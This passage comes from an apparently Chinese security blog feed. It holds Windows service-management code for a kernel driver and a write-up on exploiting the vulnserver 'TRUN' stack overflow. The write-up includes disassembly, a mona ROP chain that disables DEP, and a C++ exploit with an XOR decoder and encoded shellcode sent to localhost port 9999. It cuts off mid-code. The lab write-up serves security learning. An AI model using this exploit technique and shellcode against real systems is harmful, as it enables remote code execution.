class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//显示错误信息</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShowLastError</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  LPVOID lpMsgBuf;</span><br><span class="line">  <span class="built_in">FormatMessage</span>(</span><br><span class="line">    FORMAT_MESSAGE_ALLOCATE_BUFFER |</span><br><span class="line">    FORMAT_MESSAGE_FROM_SYSTEM |</span><br><span class="line">    FORMAT_MESSAGE_IGNORE_INSERTS,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="built_in">GetLastError</span>(),</span><br><span class="line">    <span class="built_in">MAKELANGID</span>(LANG_NEUTRAL, SUBLANG_DEFAULT), <span class="comment">// Default language</span></span><br><span class="line">    (LPTSTR)&amp; lpMsgBuf,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, lpMsgBuf);</span><br><span class="line">  <span class="built_in">LocalFree</span>(lpMsgBuf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//安装服务</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Install</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  SC_HANDLE hSCM = <span class="built_in">OpenSCManager</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, SC_MANAGER_ALL_ACCESS);</span><br><span class="line">  <span class="keyword">if</span> (hSCM == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">ShowLastError</span>();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  SC_HANDLE hService = <span class="built_in">CreateService</span>(hSCM,</span><br><span class="line">                                    SVCNAME,</span><br><span class="line">                                    SVCNAME,</span><br><span class="line">                                    SERVICE_ALL_ACCESS,</span><br><span class="line">                                    SERVICE_KERNEL_DRIVER,</span><br><span class="line">                                    SERVICE_DEMAND_START,</span><br><span class="line">                                    SERVICE_ERROR_IGNORE,</span><br><span class="line">                                    SRVPATH,</span><br><span class="line">                                    <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (hService == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">ShowLastError</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Install OK\n&quot;</span>);</span><br><span class="line">    <span class="built_in">CloseServiceHandle</span>(hService);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">CloseServiceHandle</span>(hSCM);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Unload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  SC_HANDLE hSCM = <span class="built_in">OpenSCManager</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, SC_MANAGER_ALL_ACCESS);</span><br><span class="line">  <span class="keyword">if</span> (hSCM == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">ShowLastError</span>();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  SC_HANDLE hService = <span class="built_in">OpenService</span>(hSCM, SVCNAME, SERVICE_ALL_ACCESS);</span><br><span class="line">  <span class="keyword">if</span> (hService == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">ShowLastError</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">DeleteService</span>(hService)) &#123;</span><br><span class="line">      <span class="built_in">ShowLastError</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Unload OK\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseServiceHandle</span>(hService);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">CloseServiceHandle</span>(hSCM);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//启动服务</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StartSrv</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  SC_HANDLE hSCM = <span class="built_in">OpenSCManager</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, SC_MANAGER_ALL_ACCESS);</span><br><span class="line">  <span class="keyword">if</span> (hSCM == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">ShowLastError</span>();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  SC_HANDLE hService = <span class="built_in">OpenService</span>(hSCM, SVCNAME, SERVICE_ALL_ACCESS);</span><br><span class="line">  <span class="keyword">if</span> (hService == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">ShowLastError</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">StartService</span>(hService, <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">      <span class="built_in">ShowLastError</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;StartSrv OK\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseServiceHandle</span>(hService);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">CloseServiceHandle</span>(hSCM);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//停止服务</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StopSrv</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  SC_HANDLE hSCM = <span class="built_in">OpenSCManager</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, SC_MANAGER_ALL_ACCESS);</span><br><span class="line">  <span class="keyword">if</span> (hSCM == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">ShowLastError</span>();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  SC_HANDLE hService = <span class="built_in">OpenService</span>(hSCM, SVCNAME, SERVICE_ALL_ACCESS);</span><br><span class="line">  <span class="keyword">if</span> (hService == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">ShowLastError</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    SERVICE_STATUS status;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">ControlService</span>(hService, SERVICE_CONTROL_STOP, &amp;status)) &#123;</span><br><span class="line">      <span class="built_in">ShowLastError</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;StopSrv OK\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭对象句柄</span></span><br><span class="line">    <span class="built_in">CloseServiceHandle</span>(hService);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">CloseServiceHandle</span>(hSCM);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="服务的使用">服务的使用</h2><p>可以自定义控制码，也可以使用系统提供的一些控制码，调用<code>ControlService</code> 来与<code>Ring3</code> 环的服务进行通信</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;服务&lt;/h1&gt;
&lt;p&gt;是没有&lt;code&gt;UI&lt;/code&gt;界面的程序，它要长期驻扎在后台的服务程序，任何用户都可以调用他提供的服务。&lt;/p&gt;
&lt;p&gt;如打印机，我不挑程序，什么文档编辑的程序都可以使用我这台打印机来打印。他不需要&lt;code&gt;UI&lt;/code&gt;之类的，你需要打</summary>
      
    
    
    
    <category term="内核驱动编程" scheme="https://4st.tech/categories/%E5%86%85%E6%A0%B8%E9%A9%B1%E5%8A%A8%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="内核" scheme="https://4st.tech/tags/%E5%86%85%E6%A0%B8/"/>
    
    <category term="驱动" scheme="https://4st.tech/tags/%E9%A9%B1%E5%8A%A8/"/>
    
  </entry>
  
  <entry>
    <title>利用ROP突破DEP：分析expolit_me并做rop</title>
    <link href="https://4st.tech/2021/04/07/li-yong-rop-tu-po-dep-fen-xi-expolit-me-bing-zuo-rop/"/>
    <id>https://4st.tech/2021/04/07/li-yong-rop-tu-po-dep-fen-xi-expolit-me-bing-zuo-rop/</id>
    <published>2021-04-07T08:03:36.000Z</published>
    <updated>2021-08-04T04:57:02.776Z</updated>
    
    <content type="html"><![CDATA[<h1>利用ROP突破DEP：分析expolit_me并做rop</h1><h2 id="分析目标程序">分析目标程序</h2><p>使用OD打开<code>exploit_me</code>，找到关键的几个函数的参数：</p><p>创建<code>socket</code>的几个参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0022FCB0   00000002  |Family = AF_INET</span><br><span class="line">0022FCB4   00000001  |Type = SOCK_STREAM</span><br><span class="line">0022FCB8   00000006  \Protocol = IPPROTO_TCP</span><br></pre></td></tr></table></figure><p><code>bind</code>的参数中最重要的是<code>ip</code> 地址和<code>端口号</code> 了，可以分析<code>sockaddr</code> 或者使用命令<code>netstat -ano</code></p><p><img src="https://cdn.jsdelivr.net/gh/m-Onst/pics@main/blog/202104/20210407162127.png" alt="@获取绑定的ip和端口"></p><p>可以获取到，其<code>bind</code>的是<code>0.0.0.0 : 9999</code></p><p>然后继续向下查看，在接受连接后，创建一个线程来进行处理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00401765  |.  C74424 14 000&gt;|mov dword ptr ss:[esp+0x14],0x0                     ; |</span><br><span class="line">0040176D  |.  C74424 10 000&gt;|mov dword ptr ss:[esp+0x10],0x0                     ; |</span><br><span class="line">00401775  |.  8B85 F0FDFFFF |mov eax,[local.132]                                 ; |</span><br><span class="line">0040177B  |.  894424 0C     |mov dword ptr ss:[esp+0xC],eax                      ; |</span><br><span class="line">0040177F  |.  C74424 08 481&gt;|mov dword ptr ss:[esp+0x8],vulnserv.00401848        ; |</span><br><span class="line">00401787  |.  C74424 04 000&gt;|mov dword ptr ss:[esp+0x4],0x0                      ; |</span><br><span class="line">0040178F  |.  C70424 000000&gt;|mov dword ptr ss:[esp],0x0                          ; |</span><br><span class="line">00401796  |.  E8 9D160000   |call &lt;jmp.&amp;KERNEL32.CreateThread&gt;                   ; </span><br></pre></td></tr></table></figure><p>在线程回调函数的起始位置下<code>int3</code>断点，跟踪分析，找到了调用<code>strcpy</code>的子函数，其对应的命令是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00401CDB  |&gt; \C74424 08 050&gt;|mov dword ptr ss:[esp+0x8],0x5          ; |||</span><br><span class="line">00401CE3  |.  C74424 04 F34&gt;|mov dword ptr ss:[esp+0x4],vulnserv.004&gt;; |||ASCII &quot;TRUN &quot;</span><br><span class="line">00401CEB  |.  8B45 F0       |mov eax,[local.4]                       ; |||</span><br><span class="line">00401CEE  |.  890424        |mov dword ptr ss:[esp],eax              ; |||</span><br><span class="line">00401CF1  |.  E8 C2100000   |call &lt;jmp.&amp;msvcrt.strncmp&gt;              ; ||\strncmp</span><br><span class="line">00401CF6  |.  85C0          |test eax,eax                            ; ||</span><br><span class="line">00401CF8  |.  0F85 DC000000 |jnz vulnserv.00401DDA                   ; ||</span><br><span class="line">00401CFE  |.  C70424 B80B00&gt;|mov dword ptr ss:[esp],0xBB8            ; ||</span><br><span class="line">00401D05  |.  E8 B6100000   |call &lt;jmp.&amp;msvcrt.malloc&gt;               ; |\malloc</span><br></pre></td></tr></table></figure><p>当比较通过时，则会向下继续执行，并申请了<code>0xBB8</code>的堆大小，即：<code>3000</code> 个字节。然后将发送过来的数据拷贝到该堆中，然后调用<code>CallStrcpy</code>函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00401D51  |.  C74424 08 B80&gt;||mov dword ptr ss:[esp+0x8],0xBB8       ; | 拷贝长度</span><br><span class="line">00401D59  |.  8B45 F0       ||mov eax,[local.4]                      ; |</span><br><span class="line">00401D5C  |.  894424 04     ||mov dword ptr ss:[esp+0x4],eax         ; |</span><br><span class="line">00401D60  |.  8B85 A4FAFFFF ||mov eax,[local.343]                    ; |</span><br><span class="line">00401D66  |.  890424        ||mov dword ptr ss:[esp],eax             ; |</span><br><span class="line">00401D69  |.  E8 72100000   ||call &lt;jmp.&amp;msvcrt.strncpy&gt;             ; \strncpy</span><br></pre></td></tr></table></figure><p>然后在其后面调用了<code>strcpy</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00401808  /$  55            push ebp</span><br><span class="line">00401809  |.  89E5          mov ebp,esp</span><br><span class="line">0040180B  |.  81EC E8070000 sub esp,0x7E8</span><br><span class="line">00401811  |.  8B45 08       mov eax,[arg.1]                          ; |</span><br><span class="line">00401814  |.  894424 04     mov dword ptr ss:[esp+0x4],eax           ; |</span><br><span class="line">00401818  |.  8D85 28F8FFFF lea eax,[local.502]                      ; |</span><br><span class="line">0040181E  |.  890424        mov dword ptr ss:[esp],eax               ; |</span><br><span class="line">00401821  |.  E8 A2150000   call &lt;jmp.&amp;msvcrt.strcpy&gt;                ; \strcpy</span><br><span class="line">00401826  |.  C9            leave</span><br><span class="line">00401827  \.  C3            retn</span><br></pre></td></tr></table></figure><p>经过分析可以得到其在栈空间中分配的临时的字符缓冲区大小为<code>0x7E8</code> ，即：<code>2024</code> 个字节大小</p><h2 id="构造利用">构造利用</h2><h3 id="mona找rop链">mona找rop链</h3><p>使用<code>mona</code>脚本，来构造ROP链</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">*** [ C ] ***</span><br><span class="line"></span><br><span class="line">             <span class="meta">#<span class="meta-keyword">define</span> CREATE_ROP_CHAIN(name, ...) \</span></span><br><span class="line"><span class="meta">               int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \</span></span><br><span class="line"><span class="meta">               unsigned int name[name##_length / sizeof(unsigned int)]; \</span></span><br><span class="line"><span class="meta">               create_rop_chain(name, ##__VA_ARGS__);</span></span><br><span class="line"></span><br><span class="line">             <span class="function"><span class="keyword">int</span> <span class="title">create_rop_chain</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *buf, <span class="keyword">unsigned</span> <span class="keyword">int</span> )</span></span></span><br><span class="line"><span class="function">             </span>&#123;</span><br><span class="line">               <span class="comment">// rop chain generated with mona.py - www.corelan.be</span></span><br><span class="line">               <span class="keyword">unsigned</span> <span class="keyword">int</span> rop_gadgets[] = &#123;</span><br><span class="line">                 <span class="number">0x77bf9d61</span>,  <span class="comment">// POP EBP // RETN [msvcrt.dll]</span></span><br><span class="line">                 <span class="number">0x7c862144</span>,  <span class="comment">// SetProcessDEPPolicy() [kernel32.dll]</span></span><br><span class="line">                 <span class="number">0x77eaf4de</span>,  <span class="comment">// POP EBX // RETN [RPCRT4.dll]</span></span><br><span class="line">                 <span class="number">0x62505000</span>,  <span class="comment">// &amp;0x00000000 [essfunc.dll]</span></span><br><span class="line">                 <span class="number">0x77c0dbbc</span>,  <span class="comment">// POP EDI // RETN [msvcrt.dll]</span></span><br><span class="line">                 <span class="number">0x77c0dbbc</span>,  <span class="comment">// skip 4 bytes [msvcrt.dll]</span></span><br><span class="line">                 <span class="number">0x7c96d22b</span>,  <span class="comment">// PUSHAD // RETN [ntdll.dll]</span></span><br><span class="line">               &#125;;</span><br><span class="line">               <span class="keyword">if</span>(buf != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                 <span class="built_in">memcpy</span>(buf, rop_gadgets, <span class="keyword">sizeof</span>(rop_gadgets));</span><br><span class="line">               &#125;;</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">sizeof</span>(rop_gadgets);</span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">             <span class="comment">// use the &#x27;rop_chain&#x27; variable after this call, it&#x27;s just an unsigned int[]</span></span><br><span class="line">             CREATE_ROP_CHAIN(rop_chain, );</span><br><span class="line">             <span class="comment">// alternatively just allocate a large enough buffer and get the rop chain, i.e.:</span></span><br><span class="line">             <span class="comment">// unsigned int rop_chain[256];</span></span><br><span class="line">             <span class="comment">// int rop_chain_length = create_rop_chain(rop_chain, );</span></span><br></pre></td></tr></table></figure><p>需要注意0截断的问题。</p><h3 id="exploit程序">exploit程序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;Winsock2.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;cstring&gt;</span><br><span class="line"></span><br><span class="line">#pragma comment(lib, &quot;Ws2_32.lib&quot;)</span><br><span class="line"></span><br><span class="line">bool SocketStartup()</span><br><span class="line">&#123;</span><br><span class="line">WORD wVersionRequested;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line">int err;</span><br><span class="line"></span><br><span class="line">wVersionRequested = MAKEWORD( 2, 2 );</span><br><span class="line"></span><br><span class="line">err = WSAStartup( wVersionRequested, &amp;wsaData );</span><br><span class="line">if ( err != 0 ) &#123;</span><br><span class="line">/* Tell the user that we could not find a usable */</span><br><span class="line">/* WinSock DLL.                                  */</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* Confirm that the WinSock DLL supports 2.2.*/</span><br><span class="line">/* Note that if the DLL supports versions greater    */</span><br><span class="line">/* than 2.2 in addition to 2.2, it will still return */</span><br><span class="line">/* 2.2 in wVersion since that is the version we      */</span><br><span class="line">/* requested.                                        */</span><br><span class="line"></span><br><span class="line">if ( LOBYTE( wsaData.wVersion ) != 2 ||</span><br><span class="line">        HIBYTE( wsaData.wVersion ) != 2 ) &#123;</span><br><span class="line">/* Tell the user that we could not find a usable */</span><br><span class="line">/* WinSock DLL.                                  */</span><br><span class="line">WSACleanup( );</span><br><span class="line">return false; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#define BUF_MAX_SIZE (0x7E8 + 28 + 17 + 176 + 4 + 6)</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned int rop_gadgets[] = &#123;</span><br><span class="line">0x77bf9d61,  // POP EBP // RETN [msvcrt.dll]</span><br><span class="line">0x7c862144,  // SetProcessDEPPolicy() [kernel32.dll]</span><br><span class="line">0x77eaf4de,  // POP EBX // RETN [RPCRT4.dll]</span><br><span class="line">0x62505001,  // &amp;0x00000000 [essfunc.dll]</span><br><span class="line">0x77c0dbbc,  // POP EDI // RETN [msvcrt.dll]</span><br><span class="line">0x77c0dbbc,  // skip 4 bytes [msvcrt.dll]</span><br><span class="line">0x7c96d22b,  // PUSHAD // RETN [ntdll.dll]</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">size_t nRopBytes = sizeof(rop_gadgets);</span><br><span class="line"></span><br><span class="line">char szBuf[BUF_MAX_SIZE] = &#123;0&#125;;</span><br><span class="line">memset(szBuf, 0x90, BUF_MAX_SIZE);</span><br><span class="line"></span><br><span class="line">unsigned char decode_data[17] = &#123;</span><br><span class="line">0x33, 0xC9, 0xB1, 0xC8, 0x8B, 0xFC, 0x83, 0xC7, 0x1D, 0x80, 0x37, 0x8C, 0x47, 0xFE, 0xC9, 0x75, </span><br><span class="line">0xF8</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">unsigned char encode_data[176] = &#123;</span><br><span class="line">0x70, 0xE4, 0xE6, 0x86, 0xB4, 0x92, 0xE4, 0xEF, 0x05, 0x5D, 0xC3, 0xE4, 0xBE, 0xF8, 0x1D, 0x80, </span><br><span class="line">0x07, 0x78, 0x01, 0xF2, 0x78, 0xBF, 0x57, 0x3B, 0x88, 0xA7, 0x6F, 0xEA, 0x37, 0xBF, 0xBE, 0xDF, </span><br><span class="line">0xE4, 0xF9, 0xFF, 0xE9, 0xFE, 0xD8, 0xBF, 0x5E, 0xE8, 0x07, 0x91, 0x94, 0x8C, 0x8C, 0x8C, 0x07, </span><br><span class="line">0xD7, 0xBC, 0x07, 0xD7, 0x80, 0x07, 0xD7, 0x80, 0x07, 0x97, 0x07, 0x97, 0x07, 0xE7, 0x94, 0x21, </span><br><span class="line">0xB1, 0xE6, 0x86, 0xB4, 0x92, 0xF9, 0x89, 0x19, 0x73, 0xDB, 0x74, 0x19, 0xEC, 0x07, 0xC9, 0xB0, </span><br><span class="line">0x07, 0xC0, 0x89, 0xF4, 0x8F, 0x41, 0x07, 0xD5, 0xAC, 0x8F, 0x51, 0xBF, 0x73, 0xCB, 0x07, 0xB8, </span><br><span class="line">0x37, 0x8F, 0x79, 0x15, 0x83, 0x32, 0x8A, 0xB6, 0x48, 0xF8, 0x84, 0x4D, 0x46, 0x8B, 0x8F, 0x5C, </span><br><span class="line">0xCA, 0x67, 0x7D, 0xB7, 0xD8, 0xA8, 0x90, 0xF9, 0x68, 0x07, 0xD5, 0xA8, 0x8F, 0x51, 0xEA, 0x07, </span><br><span class="line">0xB0, 0xF7, 0x07, 0xD5, 0x90, 0x8F, 0x51, 0x8F, 0xA0, 0x37, 0x19, 0xD3, 0x27, 0xDB, 0xED, 0xB1, </span><br><span class="line">0xE6, 0x86, 0xB4, 0x92, 0xF9, 0x25, 0xBF, 0x57, 0xDF, 0xE4, 0xE9, 0xE0, 0xE0, 0xE3, 0xE4, 0xFF, </span><br><span class="line">0xED, 0xF5, 0xE4, 0x07, 0x48, 0xDF, 0xDC, 0xDC, 0xDF, 0x73, 0xDB, 0x70, 0xDF, 0x73, 0xDB, 0x74</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">memcpy(szBuf, &quot;TRUN &quot;, strlen(&quot;TRUN &quot;) + 1);</span><br><span class="line">szBuf[5] = 0x2E;</span><br><span class="line">memcpy(&amp;szBuf[0x7E8 - 12], rop_gadgets, nRopBytes);</span><br><span class="line">memcpy(&amp;szBuf[0x7E8 - 12 + nRopBytes], decode_data, 17);</span><br><span class="line">memcpy(&amp;szBuf[0x7E8 - 12 + nRopBytes+ 17], encode_data, 176);</span><br><span class="line"></span><br><span class="line">if (SocketStartup() == false)</span><br><span class="line">&#123;</span><br><span class="line">return -1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SOCKET fdSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">if (fdSock == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; &quot;create socket descriptor failed&quot; &lt;&lt; std::endl;</span><br><span class="line">return -1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sockaddr_in stSockAddr = &#123;0&#125;;</span><br><span class="line"></span><br><span class="line">stSockAddr.sin_family = AF_INET;</span><br><span class="line">stSockAddr.sin_port = htons(9999);</span><br><span class="line">stSockAddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;);</span><br><span class="line"></span><br><span class="line">if (connect(fdSock, (sockaddr*)&amp;stSockAddr, sizeof(stSockAddr)) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; &quot;connect failed&quot; &lt;&lt; std::endl;</span><br><span class="line"></span><br><span 